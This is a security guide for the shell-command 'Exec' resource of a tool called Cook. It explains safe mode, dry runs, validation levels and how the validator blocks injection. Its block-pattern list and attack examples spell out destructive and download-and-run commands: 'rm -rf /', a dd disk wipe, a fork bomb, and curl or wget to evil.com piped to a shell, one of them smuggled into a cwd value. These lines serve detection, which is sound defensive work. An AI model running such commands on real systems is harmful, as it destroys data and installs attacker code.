# Exec Resource Security Guide

## Overview

The `Exec` resource in Cook executes shell commands using `subprocess.run(..., shell=True)`. This provides flexibility for complex command execution but introduces security risks if not used carefully.

**As of this version, Exec is SECURE BY DEFAULT** with `safe_mode=True` and `security_level='strict'`.

## Security Features

### 1. Safe Mode (Default: ON)

Safe mode enables strict security validation of all command inputs.

```python
# ✅ SECURE - Default behavior
Exec("backup", command="tar czf /backup/data.tar.gz /var/data")

# ⚠️ UNSAFE - Explicitly disabled (not recommended)
Exec("risky", 
     command="some_command",
     safe_mode=False)  # RED WARNING displayed
```

**When safe_mode=False:**
- A prominent RED warning is displayed at initialization
- Another RED warning is shown before each execution
- Security validation is disabled
- **Only use with 100% trusted input**

### 2. Dry Run Mode

Preview commands without execution:

```python
# Preview what would be executed
Exec("deploy",
     command="./deploy.sh --production",
     dry_run=True)  # Shows command but doesn't execute

# Output:
# [DRY RUN] Would execute for 'deploy':
#   Command: ./deploy.sh --production
#   (Not executed - dry_run=True)
```

### 3. Security Levels

Three levels of security validation:

| Level | Behavior | Use Case |
|-------|----------|----------|
| `strict` (default) | Block dangerous patterns | Production (recommended) |
| `warn` | Show warnings but allow | Testing with known risks |
| `none` | No validation | Not recommended |

```python
# Default: strict (blocks dangerous patterns)
Exec("cmd", command="echo test")

# Warn only (requires safe_mode=False)
Exec("cmd", 
     command="echo test && ls",
     safe_mode=False,
     security_level="warn")

# No validation (dangerous!)
Exec("cmd",
     command="any_command",
     safe_mode=False,
     security_level="none")
```

## Detected Security Issues

### Dangerous Shell Metacharacters

The following patterns are detected and blocked in strict mode:

| Pattern | Risk | Example |
|---------|------|---------|
| `;` | Command chaining | `cmd1; rm -rf /` |
| `&&` | Conditional execution | `cmd1 && malicious` |
| `\|\|` | Conditional execution | `cmd1 \|\| malicious` |
| `\|` | Pipe (allowed with flag) | `cmd1 \| cmd2` |
| `$()` | Command substitution | `$(malicious)` |
| `` ` `` | Backtick substitution | `` `malicious` `` |
| `${` | Variable expansion | `${PATH}malicious` |
| `>`, `<` | Redirect (allowed with flag) | `cmd > /etc/passwd` |
| `\n`, `\r` | Newline injection | `cmd\nmalicious` |

### Dangerous Command Patterns

These command patterns trigger warnings or blocks:

```python
# Recursive delete from root
"rm -rf /"

# Disk operations
"dd if=/dev/zero of=/dev/sda"

# Format filesystem
"mkfs.ext4 /dev/sda1"

# Fork bomb
":(){ :|:& };:"

# World-writable permissions
"chmod 777 /etc/passwd"

# Pipe to shell (common attack vector)
"curl http://evil.com/malware.sh | bash"
"wget -O- http://evil.com/script | sh"

# Eval injection
"eval $user_input"

# Direct disk access
"dd of=/dev/sda"
```

### Path Validation

Paths (in `cwd`, `creates`) are checked for:

```python
# Directory traversal
cwd="../../../etc"  # BLOCKED

# Command injection
cwd="/tmp; malicious"  # BLOCKED

# Null byte injection
creates="/tmp/file\x00.txt"  # BLOCKED
```

### Environment Variable Validation

Environment variables are validated for:

```python
# Invalid variable names
environment={"invalid-name": "value"}  # BLOCKED

# Command injection in values
environment={"VAR": "value; rm -rf /"}  # BLOCKED
```

## Attack Vectors & Mitigations

### 1. Command Injection via Parameters

**Attack:**
```python
user_input = "; rm -rf /"
Exec("bad", command=f"echo {user_input}")  # DANGEROUS!
```

**Mitigation:**
```python
# Safe mode blocks this automatically
try:
    Exec("bad", command="echo ; rm -rf /")  # BLOCKED
except SecurityViolation:
    print("Blocked by safe_mode")

# If you must use dynamic input, validate strictly
import re
if re.match(r'^[a-zA-Z0-9_-]+$', user_input):
    Exec("safe", command=f"echo {user_input}")
else:
    raise ValueError("Invalid input")
```

### 2. Environment Variable Injection

**Attack:**
```python
Exec("bad",
     command="printenv",
     environment={"PATH": "/evil; malicious"})  # BLOCKED
```

**Mitigation:**
```python
# Safe mode validates environment variables
# Values are automatically quoted with shlex.quote()
Exec("safe",
     command="printenv",
     environment={"PATH": "/usr/bin"})  # OK
```

### 3. Working Directory Injection

**Attack:**
```python
Exec("bad",
     command="ls",
     cwd="/tmp; curl evil.com/malware | sh")  # BLOCKED
```

**Mitigation:**
```python
# Safe mode validates paths
# Paths are quoted with shlex.quote()
Exec("safe",
     command="ls",
     cwd="/tmp")  # OK
```

### 4. Guard Command Injection

**Attack:**
```python
Exec("bad",
     command="echo test",
     unless="false; malicious")  # BLOCKED
```

**Mitigation:**
Safe mode validates `unless` and `only_if` commands.

## Safe Usage Patterns

### Pattern 1: Simple Commands

```python
# No shell features needed
Exec("restart-nginx",
     command="systemctl restart nginx")
```

### Pattern 2: Idempotent Operations

```python
# Only run if file doesn't exist
Exec("download-file",
     command="wget https://example.com/file.tar.gz",
     creates="/tmp/file.tar.gz")

# Only run if command fails
Exec("install-tool",
     command="pip install mytool",
     unless="which mytool")

# Only run if command succeeds
Exec("migrate-db",
     command="python manage.py migrate",
     only_if="test -f /app/db_ready")
```

### Pattern 3: Pipes (Explicitly Allowed)

```python
# Pipes are common and allowed by default
Exec("find-process",
     command="ps aux | grep nginx | head -5",
     allow_pipes=True)  # default
```

### Pattern 4: Redirects (Explicitly Allowed)

```python
# Redirects for output
Exec("backup-logs",
     command="journalctl -u nginx > /backup/nginx.log",
     allow_redirects=True)  # default
```

### Pattern 5: Preview Before Execution

```python
# Always test with dry_run first
exec_resource = Exec("deploy",
                     command="./deploy.sh --production",
                     dry_run=True)

# Review the final command
print(f"Will execute: {exec_resource.preview()}")

# Then run for real
Exec("deploy", 
     command="./deploy.sh --production",
     dry_run=False)
```

### Pattern 6: Security Report

```python
# Analyze security without executing
exec_resource = Exec("analyze",
                     command="risky_command",
                     safe_mode=False,
                     security_level="none",
                     dry_run=True)

report = exec_resource.get_security_report()
print(f"Risk Level: {report['risk_level']}")
print(f"Issues: {len(report['issues'])}")
for issue in report['issues']:
    print(f"  - {issue}")
```

## Unsafe Patterns to Avoid

### ❌ DON'T: Pass User Input Directly

```python
# NEVER do this
filename = input("Enter filename: ")
Exec("bad", 
     command=f"cat {filename}",
     safe_mode=False)  # Command injection!
```

### ❌ DON'T: Disable Safe Mode Without Good Reason

```python
# Avoid this unless absolutely necessary
Exec("risky",
     command="some_command",
     safe_mode=False)  # Will show RED warnings
```

### ❌ DON'T: Use Exec for What Other Resources Can Do

```python
# BAD - use Package resource instead
Exec("install", "apt-get install nginx")

# GOOD
Package("nginx")

# BAD - use File resource instead
Exec("config", "echo 'content' > /etc/config")

# GOOD
File("/etc/config", content="content")

# BAD - use Service resource instead
Exec("restart", "systemctl restart nginx")

# GOOD
Service("nginx", running=True)
```

## Disabling Safe Mode

If you absolutely must disable safe_mode:

```python
Exec("legacy-script",
     command="./legacy_script.sh",  # Fully trusted
     safe_mode=False)  # Explicit opt-out
```

**You will see:**

```
======================================================================
⚠️  SECURITY WARNING: Exec resource 'legacy-script' is running in UNSAFE MODE
======================================================================
  safe_mode=False disables security validation
  Command: ./legacy_script.sh
  This is DANGEROUS and should only be used with fully trusted input.
  Set safe_mode=True (default) for security validation.
======================================================================

⚠️  EXECUTING IN UNSAFE MODE: legacy-script
```

**Only disable safe_mode if:**
1. Command and all inputs are 100% trusted
2. No user input is involved
3. You understand the security implications
4. You accept responsibility for command injection risks

## Migration Guide

### Existing Code (Before Secure-by-Default)

If you have existing Exec resources that now fail validation:

#### Option 1: Fix the Security Issues (Recommended)

```python
# Old (blocked by safe_mode)
Exec("old", command="echo test && ls")

# New (use separate commands or disable chaining)
Exec("echo", command="echo test")
Exec("list", command="ls")
```

#### Option 2: Explicitly Allow Patterns

```python
# Old
Exec("pipe", command="ps aux | grep nginx")

# New (pipes allowed by default, but be explicit)
Exec("pipe", 
     command="ps aux | grep nginx",
     allow_pipes=True)
```

#### Option 3: Opt Out (Not Recommended)

```python
# Last resort - disable safe_mode
Exec("legacy",
     command="complex && chained | commands",
     safe_mode=False)  # RED warnings will appear
```

## Best Practices Summary

1. ✅ **Use dry_run=True** when testing new commands
2. ✅ **Keep safe_mode=True** (default) in production
3. ✅ **Never pass unsanitized user input** to Exec
4. ✅ **Use creates/unless/only_if** for idempotency
5. ✅ **Preview commands** with `.preview()` before execution
6. ✅ **Review security reports** with `.get_security_report()`
7. ✅ **Prefer dedicated resources** (Package, File, Service) over Exec
8. ✅ **Validate user input** if you must use it (regex whitelist)
9. ✅ **Use guards** to prevent unnecessary re-execution
10. ✅ **Document why** if you disable safe_mode

## Security Checklist

Before deploying Exec resources:

- [ ] Reviewed all Exec commands for injection risks
- [ ] Tested with dry_run=True
- [ ] Verified no user input reaches command parameters
- [ ] Used preview() to inspect final commands
- [ ] Checked security_report() for high-risk patterns
- [ ] Considered if Package/File/Service resource would be better
- [ ] Added creates/unless/only_if guards where appropriate
- [ ] Documented why safe_mode=False if used
- [ ] Tested in isolated environment first
- [ ] Code reviewed by security-aware team member

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- Python shlex.quote() documentation
- Cook SECURITY.md (project security policy)

## Reporting Security Issues

Found a security issue in Exec resource validation? Please report responsibly:

- **DO NOT** open public GitHub issues for security vulnerabilities
- Email: [your-email@example.com]
- Include: description, reproduction steps, potential impact

---

**Last Updated:** December 29, 2024
**Security Review:** December 29, 2024
